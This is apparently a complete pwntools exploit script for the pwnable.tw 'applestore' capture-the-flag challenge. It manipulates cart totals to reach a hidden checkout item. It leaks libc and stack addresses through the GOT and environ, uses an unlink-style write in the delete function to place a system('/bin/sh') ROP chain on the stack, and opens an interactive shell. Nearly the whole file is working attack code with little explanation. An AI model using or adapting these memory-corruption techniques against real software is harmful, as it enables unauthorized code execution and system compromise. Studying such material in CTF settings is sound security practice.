from pwn import *

io = remote('chall.pwnable.tw', 10104)
elf = ELF('./applestore')
libc = ELF('./libc_32.so.6')

def add(number):
    io.recvuntil('> ')
    io.send('2')
    io.recvuntil('Device Number> ')
    io.send(number)

def delete(number):
    io.recvuntil('> ')
    io.send('3')
    io.recvuntil('Item Number> ')
    io.send(number)

def cart(yn):
    io.recvuntil('> ')
    io.sendline('4')
    io.recvuntil('Let me check your cart. ok? (y/n) > ')
    io.sendline(yn)
    if yn[0] == ord(b'y'):
        leak = io.recvuntil(' - $0', drop = True)
        return leak
    else:
        return None

def checkout(yn, iphone8 = False):
    io.recvuntil('> ')
    io.sendline('5')
    io.recvuntil('Let me check your cart. ok? (y/n) > ')
    io.sendline(yn)

def leave():
    io.recvuntil('> ')
    io.sendline('6')

'''
199 * 10 + 299 * 12 + 399 * 4 == 7174
'''
for i in range(10):
    add(b'1')
for i in range(12):
    add(b'2')
for i in range(4):
    add(b'4')
checkout('y', True)

# leak libc address
leak = cart(b'yy' + p32(elf.got['read']) + p32(0) + p32(0) + p32(0)).split(b'\n')[-1]
libc.address = u32(leak[4:8]) - 0xd41c0

# leak stack address via environ
leak = cart(b'yy' + p32(libc.sym['environ']) + p32(0) + p32(0) + p32(0)).split(b'\n')[-1]
rop_addr = u32(leak[4:8]) - 0xa0

# write rop gadget
system_addr = libc.sym['system']
sh_addr = next(libc.search(b'/bin/sh'))
rop_gadget = p32(system_addr) + p32(0) + p32(sh_addr)
write_addr = libc.address + 0x1b4e00

for index, char in enumerate(rop_gadget):
    delete(b'27' + p32(0) + p32(0) + p32(write_addr + char) + p32(rop_addr - 0x8 + index))

# trigger rop
leave()

io.interactive()
